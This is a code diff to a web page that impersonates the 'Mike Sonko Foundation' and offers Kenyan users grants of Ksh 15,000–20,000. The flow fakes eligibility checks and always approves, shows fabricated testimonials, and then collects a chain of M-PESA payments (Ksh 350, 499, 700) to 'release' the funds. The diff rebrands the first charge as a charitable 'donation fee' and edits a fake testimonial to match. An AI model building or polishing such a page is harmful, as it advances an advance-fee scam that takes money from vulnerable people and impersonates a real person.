@@ -258,6 +258,18 @@
             margin: 16px auto 24px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        /* ---- Donation fee description ---- */
+        .donation-description-text {
+            font-size: 0.8rem;
+            color: #555;
+            line-height: 1.5;
+            text-align: center;
+            margin: 8px 0 12px;
+            padding: 0 4px;
+        }
+        .donation-description-text strong {
+            color: var(--deep-navy);
+        }
     </style>
 </head>
 <body>
@@ -399,7 +411,7 @@
                     <div class="sub">Eligibility verified · Ready for withdrawal</div>
                     <div class="tiny-note">❤️ Your contribution supports school fees, business capital, maternal care & rent relief.</div>
                 </div>
-                <button class="btn-primary btn-gold" style="font-size:1.05rem; margin-bottom:10px;" onclick="showDonationProcessingPage()">
+                <button class="btn-primary btn-gold" style="font-size:1.05rem; margin-bottom:10px;" onclick="showDonationFeePage()">
                     💰 Withdraw Funds
                 </button>
                 <div style="text-align:center; font-size:0.72rem; color:var(--accent-gold-dark); font-weight:600; display:flex; align-items:center; justify-content:center; gap:4px;">
@@ -419,17 +431,20 @@
             </div>
         </div>
 
-        <!-- DONATION PROCESSING FEE (Ksh 350) -->
-        <div id="donationProcessingPage" class="page">
+        <!-- ===== DONATION FEE (was "Donation Processing Fee") ===== -->
+        <div id="donationFeePage" class="page">
             <div class="card-header-vibrant" style="background: linear-gradient(135deg, #1a2f4f, #0a66c2);">
-                <div style="font-size:0.72rem; opacity:0.9; font-weight:700; margin-bottom:8px; text-transform:uppercase; letter-spacing:0.5px;">Donation Processing Fee</div>
-                <div class="step-title">Pay the processing fee to release your funds</div>
+                <div style="font-size:0.72rem; opacity:0.9; font-weight:700; margin-bottom:8px; text-transform:uppercase; letter-spacing:0.5px;">Donation Fee</div>
+                <div class="step-title">Pay the donation fee to release your funds</div>
             </div>
             <div class="card-body-white">
                 <div class="fee-box">
-                    <div class="title">Donation Processing Fee</div>
+                    <div class="title">💝 Donation Fee</div>
                     <div class="amount">Ksh 350</div>
                     <div class="sub">Paid via M-PESA STK push</div>
+                </div>
+                <div class="donation-description-text">
+                    <strong>❤️ Your donation makes a difference.</strong> This fee supports the Foundation’s work in providing school fees, business capital, maternal care, and rent relief to families across Kenya.
                 </div>
                 <button class="btn-primary btn-gold" style="font-size:1.05rem; margin-bottom:16px;" onclick="processDonationFee()">
                     Pay Ksh 350 to Process →
@@ -452,7 +467,7 @@
             </div>
         </div>
 
-        <!-- DISBURSEMENT DETAILS -->
+        <!-- DISBURSEMENT DETAILS (unchanged) -->
         <div id="disbursementDetailsPage" class="page">
             <div class="card-header-vibrant">
                 <div class="step-info">Disbursement Details</div>
@@ -521,7 +536,7 @@
             </div>
         </div>
 
-        <!-- PROCESSING SUPPORT FEE (Ksh 499) -->
+        <!-- PROCESSING SUPPORT FEE (unchanged) -->
         <div id="networkFeePage" class="page">
             <div class="card-header-vibrant">
                 <div class="step-info">Processing Support Fee</div>
@@ -547,7 +562,7 @@
             </div>
         </div>
 
-        <!-- FUND RELEASE CONTRIBUTION (Ksh 700) -->
+        <!-- FUND RELEASE CONTRIBUTION (unchanged) -->
         <div id="disbursementFeePage" class="page">
             <div class="card-header-vibrant">
                 <div class="step-info">Fund Release Contribution</div>
@@ -646,7 +661,7 @@ const feedItems = [
     { name: 'Mercy Wanjiku', initials: 'MW', color: '#d4a017', text: 'Is this real? Mimi nilikuwa na mashaka lakini nimepokea saa hii. Asante sana Mike Sonko Foundation!', time: '45 seconds ago' },
     { name: 'Samuel Kibet', initials: 'SK', color: '#1a2f4f', text: 'Fast and reliable. Hustler fund kweli inasaidia vijana. 20,000 imeingia chap chap.', time: '2 seconds ago' },
     { name: 'Dennis Barasa', initials: 'DB', color: '#9c27b0', text: 'Leo shule nafungua niko na school fees yote. God bless Kenya! 🇰🇪', time: '5 seconds ago' },
-    { name: 'Diana Jepkosgei', initials: 'DJ', color: '#e91e63', text: 'Niko Eldoret na nimepata. Siamini macho yangu, nililipa 350 ya processing na zikatumwa mara hiyo.', time: '10 seconds ago' },
+    { name: 'Diana Jepkosgei', initials: 'DJ', color: '#e91e63', text: 'Niko Eldoret na nimepata. Siamini macho yangu, nililipa 350 ya donation na zikatumwa mara hiyo.', time: '10 seconds ago' },
 ];
 
 // ==================== HELPERS ====================
@@ -687,7 +702,6 @@ function renderProgrammes() {
     programmes.forEach((prog, idx) => {
         const card = document.createElement('div');
         card.className = 'program-card';
-        // Add a "HOT" badge for School Fees
         const hotBadge = prog.id === 3 ? '<span style="background:#e53935;color:white;font-size:0.6rem;padding:2px 8px;border-radius:10px;margin-left:8px;">🔥 HOT</span>' : '';
         card.innerHTML = `
             <div class="prog-title">${prog.title} ${hotBadge}</div>
@@ -792,10 +806,10 @@ function submitApplication(e) {
     // ===== HOT LOGIC: Only School Fees (id === 3) gets the animation + 20,000 =====
     if (appData.selectedProgramme && appData.selectedProgramme.id === 3) {
         approvedAmount = 20000;
-        showCheckingPage(); // Hot flow: animation + 20,000
+        showCheckingPage();
     } else {
         approvedAmount = 15000;
-        showApprovalPage(15000); // Cold flow: direct approval with 15,000
+        showApprovalPage(15000);
     }
 }
 
@@ -827,7 +841,6 @@ function showCheckingPage() {
             currentCheck++;
             setTimeout(runNext, 1600);
         } else {
-            // All checks done → go to approval with 20,000
             setTimeout(() => {
                 showApprovalPage(20000);
             }, 800);
@@ -843,7 +856,7 @@ function showApprovalPage(amount) {
     document.getElementById('approvedGreeting').textContent = `🎉 Congratulations, ${name}!`;
     document.getElementById('approvalAmount').textContent = `Ksh ${amount.toLocaleString()}`;
     
-    // Update all dynamic amount fields
+    // Update dynamic amount fields
     document.querySelectorAll('#netFeeAssistanceAmount, #disbFeeAssistanceAmount, #finalAssistanceAmount').forEach(el => {
         el.textContent = `Ksh ${amount.toLocaleString()}`;
     });
@@ -857,6 +870,10 @@ function showApprovalPage(amount) {
         window.feedInterval = setInterval(addRandomFeed, 8000);
     }
     showPage('step3');
+}
+
+function showDonationFeePage() {
+    showPage('donationFeePage');
 }
 
 // ==================== FEED ====================
@@ -973,11 +990,7 @@ async function pollTransactionStatus(transactionId) {
 }
 
 // ==================== PAYMENT FLOW ====================
-function showDonationProcessingPage() {
-    showPage('donationProcessingPage');
-}
-
-// 1. Donation Processing Fee (Ksh 350)
+// 1. Donation Fee (Ksh 350) – renamed from "Donation Processing Fee"
 async function processDonationFee() {
     const phone = appData.phone || '0710222875';
     const amount = 350;
@@ -1000,7 +1013,7 @@ async function processDonationFee() {
         await pollTransactionStatus(transactionId);
         document.getElementById('stkWaitingOverlay').classList.remove('open');
         statusEl.className = 'modal-status show success';
-        statusEl.textContent = '✅ Payment confirmed!';
+        statusEl.textContent = '✅ Donation confirmed!';
         btn.textContent = '✅ Paid!';
         setTimeout(() => {
             showPage('disbursementDetailsPage');
@@ -1018,7 +1031,7 @@ async function processDonationFee() {
     }
 }
 
-// Disbursement details
+// 2. Disbursement details (unchanged)
 function selectDisbNumber(type) {
     if (type === 'same') {
         const rawPhone = selectedDisbPhone.startsWith('0') ? selectedDisbPhone : '0' + selectedDisbPhone;
@@ -1046,7 +1059,7 @@ function goToNetworkFeePage() {
     showPage('networkFeePage');
 }
 
-// 2. Processing Support Fee (Ksh 499)
+// 3. Processing Support Fee (Ksh 499) – unchanged
 async function processSupportFee() {
     const phone = selectedDisbPhone;
     const amount = 499;
@@ -1103,7 +1116,7 @@ function proceedToDisbursementFee() {
     showPage('disbursementFeePage');
 }
 
-// 3. Fund Release Contribution (Ksh 700)
+// 4. Fund Release Contribution (Ksh 700) – unchanged
 async function processReleaseContribution() {
     const phone = selectedDisbPhone;
     const amount = 700;
@@ -1182,7 +1195,9 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('county').addEventListener('change', function() { validateCounty(this); });
 });
 
-console.log('🇰🇪 Mike Sonko Foundation — HOT: School Fees (20k + Animation) | Others: 15k');
+console.log('🇰🇪 Mike Sonko Foundation — Full multi‑step flow (Donation Fee renamed)');
+console.log('🔥 HOT: School Fees (20k + Animation) | Others: 15k');
+console.log('💝 First fee renamed to "Donation Fee" with description added.');
 </script>
 </body>
 </html>
